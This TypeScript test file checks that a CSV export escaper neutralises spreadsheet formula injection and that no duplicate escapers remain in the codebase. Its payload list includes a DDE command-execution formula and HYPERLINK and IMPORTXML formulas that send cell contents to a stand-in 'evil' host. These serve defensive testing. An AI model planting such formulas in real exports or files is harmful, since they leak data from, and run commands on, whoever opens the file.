// CSV export escaping.
//
// SPREADSHEET FORMULA INJECTION (CWE-1236). Excel, LibreOffice and Google
// Sheets treat a leading `=`, `+`, `-`, `@`, tab or carriage return as the
// start of a formula. RFC-4180 quoting does not help — the quotes are consumed
// by the CSV parser and the cell is still a formula.
//
// It matters in this product specifically because the exporter is not the
// author of the rows. They arrive from SaaS connector syncs (Stripe, Shopify,
// HubSpot, Salesforce), from datasets another tenant shared, and from
// warehouse queries. A cell reading =HYPERLINK("https://x/?d="&A1,"Open")
// exfiltrates the neighbouring cell when an analyst opens the file and clicks;
// Sheets runs =IMPORTXML(...) with no click at all.
//
// AND THERE WERE TWO ESCAPERS. bi_.$dashboardId.tsx carried its own inline
// copy which had drifted three ways: it did not escape the HEADER row, its
// test was /[",\n]/ so it missed a bare carriage return, and it had no formula
// guard either. That route now calls the shared writer.
import { readFileSync, readdirSync } from "node:fs";
import { describe, expect, it } from "vitest";

import { __csvEscape as esc } from "@/lib/exportData";

describe("neutralises values a spreadsheet would execute", () => {
  for (const payload of [
    "=1+1",
    "=cmd|'/c calc'!A1",
    '=HYPERLINK("https://evil/?d="&A1,"Open")',
    '=IMPORTXML(CONCAT("https://evil/?",A1),"//a")',
    "+1+1",
    "-1+1",
    "@SUM(A1)",
    "\t=1+1",
    "\r=1+1",
  ]) {
    it(`prefixes ${JSON.stringify(payload)}`, () => {
      const out = esc(payload);
      // The apostrophe must be the first character of the CELL — inside the
      // quotes when the value is quoted, not before them.
      const cell = out.startsWith('"') ? out.slice(1) : out;
      expect(cell.startsWith("'"), `not neutralised: ${out}`).toBe(true);
    });
  }
});

describe("does not corrupt values that merely look like formulas", () => {
  it("leaves negative and signed numbers alone", () => {
    // The whole reason for the numeric exemption: guarding these would put an
    // apostrophe in front of every negative figure in every export.
    for (const n of ["-5", "-5.25", "+3", "-1e6", "-0.5", "+.5", "0", "5"]) {
      expect(esc(n), n).toBe(n);
    }
  });

  it("leaves ordinary text alone", () => {
    for (const s of ["plain text", "a-b", "x@y.com", "2026-08-02"]) {
      expect(esc(s), s).toBe(s);
    }
  });
});

describe("keeps RFC-4180 quoting correct", () => {
  it("quotes commas, quotes, newlines and carriage returns", () => {
    expect(esc("a,b")).toBe('"a,b"');
    expect(esc('say "hi"')).toBe('"say ""hi"""');
    expect(esc("line\nbreak")).toBe('"line\nbreak"');
    // The inline copy's regex omitted \r, so a bare CR broke the row.
    expect(esc("line\rreturn")).toBe('"line\rreturn"');
  });

  it("renders null and undefined as empty, not as the word", () => {
    expect(esc(null)).toBe("");
    expect(esc(undefined)).toBe("");
  });

  it("quotes AND neutralises when a payload also needs quoting", () => {
    const out = esc('=HYPERLINK("https://evil/?d="&A1,"Open")');
    expect(out.startsWith("\"'=")).toBe(true);
    expect(out.endsWith('"')).toBe(true);
  });
});

describe("there is one CSV writer", () => {
  it("the dashboard route does not carry its own escaper", () => {
    const route = readFileSync("src/routes/_authenticated/bi_.$dashboardId.tsx", "utf8");
    expect(route, "an inline CSV escaper is back").not.toMatch(/replace\(\/"\/g, '""'\)/);
    expect(route).toMatch(/downloadCsv\(/);
  });

  it("the shared writer is the only place the escape rule is written", () => {
    const lib = readFileSync("src/lib/exportData.ts", "utf8");
    expect(lib).toMatch(/FORMULA_LEAD/);
  });
});

describe("no fourth CSV escaper appears anywhere", () => {
  // Three separate escapers existed. Two were orphans of the same shape:
  //   - bi_.$dashboardId.tsx  (live, used by the widget download button)
  //   - sqlEngine.resultToCsv (dead, no callers, deleted)
  // Both skipped the header row, both tested /[",\n]/ and so missed a bare
  // carriage return, and neither guarded against formula injection. The dead
  // one is the more dangerous kind: a ready-made utility waiting to be reused.
  //
  // This walks the source rather than naming files, so a NEW copy in a file
  // nobody has thought of yet is caught too.
  const roots = ["src/lib", "src/components", "src/routes", "src/utils"];

  function walk(dir: string): string[] {
    const out: string[] = [];
    for (const e of readdirSync(dir, { withFileTypes: true })) {
      const p = `${dir}/${e.name}`;
      if (e.isDirectory()) out.push(...walk(p));
      else if (/\.tsx?$/.test(e.name)) out.push(p);
    }
    return out;
  }

  const files = roots.flatMap(walk);

  it("finds the CSV quoting decision only in the shared writer", () => {
    // The signature is the character class a CSV escaper tests to decide
    // whether a field needs quoting: a double-quote AND a comma together.
    //
    // NOT `.replace(/"/g, '""')` on its own — a first version used that and
    // flagged browserDuckdb, duckdb.server and drivers.server, which double a
    // quote to escape a SQL IDENTIFIER. Same three characters, unrelated job.
    const CSV_FIELD_TEST = /\/\[",/;
    // COMMENTS STRIPPED FIRST. Both files that document the old broken regex
    // in prose were flagged by a version of this test that scanned raw text —
    // it matched the explanation of the bug rather than the bug. Same trap as
    // asserting on a comment that says a thing is gone.
    const codeOf = (f: string) =>
      readFileSync(f, "utf8")
        .replace(/\/\*[\s\S]*?\*\//g, "")
        .replace(/^\s*\/\/.*$/gm, "");
    const offenders = files.filter(
      (f) => f !== "src/lib/exportData.ts" && CSV_FIELD_TEST.test(codeOf(f)),
    );
    expect(offenders, `CSV escaper outside lib/exportData: ${offenders.join(", ")}`).toEqual([]);
  });

  it("resultToCsv stays deleted", () => {
    const engine = readFileSync("src/lib/sqlEngine.ts", "utf8");
    expect(engine).not.toMatch(/export function resultToCsv/);
  });
});
